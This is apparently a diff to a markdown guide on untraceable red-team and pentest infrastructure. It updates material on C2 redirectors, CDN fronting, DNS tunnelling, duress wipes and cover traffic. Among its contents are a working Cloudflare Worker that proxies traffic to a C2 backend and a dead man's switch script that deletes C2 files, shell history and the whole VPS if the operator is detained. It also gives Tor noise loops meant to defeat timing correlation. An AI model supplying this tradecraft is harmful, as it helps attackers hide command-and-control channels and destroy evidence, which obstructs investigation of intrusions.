@@ -13,6 +13,10 @@ Covers the gaps between basic pentest untraceability and full red team infrastru
 - What to do if detained with live infrastructure
 - Cover traffic to defeat timing correlation
 
+> **OS Compatibility Note:** This document assumes **Qubes OS** as the base for operations requiring persistent infrastructure (dead man's switch keepalive, background cover traffic, long-running SSH tunnels). **Tails OS** (recommended in field-opsec-technical/SKILL.md for daily ops) is amnésic — it does NOT maintain state between sessions and cannot run background processes persistently.
+>
+> Rule: **Tails** for journalism/browsing/comms. **Qubes** for pentest work requiring persistent infra. Never mix the two roles on the same OS instance.
+
 ---
 
 ## C2 Infrastructure — Redirectors
@@ -63,41 +67,41 @@ server {
 
 ## Domain Fronting / CDN Fronting
 
-Make C2 traffic look like requests to major CDN (Cloudflare, AWS CloudFront, Azure CDN). Works even in highly censored environments because blocking CDN = blocking half the internet.
+> **Status (2025-2026): Classic domain fronting is essentially dead on major CDNs.** AWS CloudFront blocked it in 2018. Azure blocked it in 2021. Fastly restricted significantly. Do NOT build an operational plan that depends on this working — it will likely fail at the worst moment.
 
-### How It Works
-```
-Implant connects to: cloudfront.net (or legit CDN domain)
-SNI/TLS shows:        legit-site.cloudfront.net
-Host header says:     your-c2.cloudfront.net (different subdomain)
-CDN routes to:        your actual C2 backend
-```
-DPI sees CloudFront TLS. Can't inspect Host header (encrypted). Traffic reaches your C2.
+### What Still Works
 
-### Cloudfront Setup
+**meek-azure (via Tor):** Microsoft maintains a specific endpoint for censorship circumvention (in partnership with EFF) that routes through Azure CDN. This is built into Tor Browser. Use it as a Tor bridge, not as DIY C2 infrastructure.
+
+**Cloudflare Workers as modern replacement:**
 ```bash
-# 1. Register domain and add to Cloudfront as custom origin
-# 2. Point origin to your C2 server
-# 3. In implant: connect to <anything>.cloudfront.net
-#    Set Host header to: <your-subdomain>.cloudfront.net
-# Traffic is indistinguishable from normal CDN usage
+# Cloudflare Workers allow custom routing through their CDN
+# 1. Create a Worker that proxies requests to your C2 backend
+# 2. Deploy on workers.dev subdomain
+# 3. Traffic looks like Cloudflare CDN traffic
 
-# Test:
-curl -H "Host: your-c2-subdomain.cloudfront.net" \
-     https://d1234567.cloudfront.net/beacon
+# worker.js example:
+addEventListener('fetch', event => {
+  event.respondWith(
+    fetch('https://your-c2-backend.com' + new URL(event.request.url).pathname, {
+      method: event.request.method,
+      headers: event.request.headers,
+      body: event.request.body
+    })
+  )
+})
+# Cloudflare IPs are effectively never blocked — too much collateral damage
 ```
 
-### Note
-Cloudfront and Azure have partially restricted this. Alternatives:
-- **Fastly**: still works with custom origins
-- **Azure CDN**: classic tier still allows fronting
-- Self-hosted CDN-like infrastructure with nginx
+**Test in-country first:** Before depending on any CDN-based evasion, verify the specific provider/endpoint is accessible from a local SIM before committing to it as your primary channel.
 
 ---
 
 ## Covert Channels — Fallback if Tor/VPN Blocked
 
-### DNS over HTTPS (DoH) Tunnel — iodine
+### DNS Tunnel — iodine
+> **Nomenclature fix:** iodine is a **DNS tunnel (UDP/TCP port 53)**, NOT "DNS over HTTPS (DoH)". DoH and DNS tunnels are completely different technologies with different detection profiles. iodine encodes data in DNS query payloads — it does NOT use port 443 or HTTPS.
+
 ```bash
 # If all TCP is blocked but DNS resolves (common in restricted networks):
 # Server side (VPS):
@@ -154,9 +158,14 @@ ssh -p 2222 user@127.0.0.1
 ```bash
 # Android (GrapheneOS):
 # Settings → Security → Duress password
-# Enter duress password → wipes device immediately, shows "wrong password"
+# Enter duress password → initiates factory reset (NOT instantaneous — takes time)
+# CRITICAL: must be configured and TESTED on a non-production device before mission
+# CRITICAL: if power is cut during wipe, process may not complete — physical destruction is more reliable
 
-# Laptop (Tails): pull USB = session gone, RAM cleared in ~30s on modern hardware
+# Laptop (Tails): pull USB = session gone
+# RAM retention WARNING: cold boot attacks can recover keys from DDR4/DDR5 for seconds to minutes
+# at room temperature, and hours if adversary has cooling (spray cans, liquid nitrogen)
+# "30 seconds is safe" is a myth. Power off + physical distance from device is the goal.
 
 # Laptop (Qubes/LUKS): 
 # Emergency: hold power button 5s = hard shutdown
@@ -185,18 +194,20 @@ sudo dpkg-reconfigure cryptsetup-nuke
 
 # On VPS, /opt/deadman.sh:
 #!/bin/bash
-CHECKIN_FILE="/tmp/.alive"
+CHECKIN_FILE="/opt/.alive"  # NOT /tmp/ — tmpfs doesn't persist across reboots
 MAX_AGE=7200  # 2 hours without check-in = burn
 
-if [ $(( $(date +%s) - $(stat -c %Y $CHECKIN_FILE) )) -gt $MAX_AGE ]; then
-    # Wipe sensitive data
-    shred -u /opt/c2/* /tmp/attack* ~/.bash_history
-    # Or destroy the whole VPS via provider API:
+if [ ! -f "$CHECKIN_FILE" ] || [ $(( $(date +%s) - $(stat -c %Y "$CHECKIN_FILE") )) -gt $MAX_AGE ]; then
+    # Wipe sensitive data (note: shred is unreliable on SSD — destroying via API is more reliable)
+    find /opt/c2/ -type f -exec rm -f {} \;
+    rm -f ~/.bash_history
+    # Destroy the whole VPS via provider API (most reliable wipe):
     curl -X DELETE -H "Authorization: Bearer $VPS_API_KEY" \
          https://api.provider.com/v2/droplets/$DROPLET_ID
 fi
 
-# Your machine: touch /tmp/.alive every 30min via cron over SSH
+# Your machine: touch /opt/.alive every 20min via cron over SSH
+# Verify /tmp is NOT tmpfs before using: df -h /tmp (tmpfs = file disappears on reboot)
 # If you're detained and can't check in → VPS self-destructs in 2h
 ```
 
@@ -216,14 +227,26 @@ fi
 State adversary can correlate: "traffic burst from your IP → Tor → NGO IP" even without decrypting.
 
 ### Continuous Baseline Traffic
-```bash
-# On your machine: constant low-rate noise to Tor (masks when real activity happens)
-while true; do
-    curl -s --socks5 127.0.0.1:9050 https://check.torproject.org > /dev/null
-    sleep $(( RANDOM % 60 + 30 ))  # 30-90s random interval
-done
 
-# On VPS: similar noise to unrelated destinations
+> **Warning:** The naive approach (loop curling one fixed endpoint) creates a **beacon pattern** — regular pulses to the same destination — which is MORE suspicious than no traffic. Cover traffic must vary destinations and volumes.
+
+```bash
+# Multi-destination noise (actually mimics organic browsing):
+DESTINATIONS=(
+    "https://www.wikipedia.org"
+    "https://www.bbc.com"
+    "https://www.reuters.com"
+    "https://duckduckgo.com"
+    "https://www.un.org"
+)
+
+while true; do
+    dest="${DESTINATIONS[$((RANDOM % ${#DESTINATIONS[@]}))]}"
+    curl -s --socks5 127.0.0.1:9050 \
+         -A "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" \
+         "$dest" > /dev/null
+    sleep $(( RANDOM % 180 + 60 ))  # 1-4min random interval, not 30-90s
+done
 ```
 
 ### Traffic Shaping
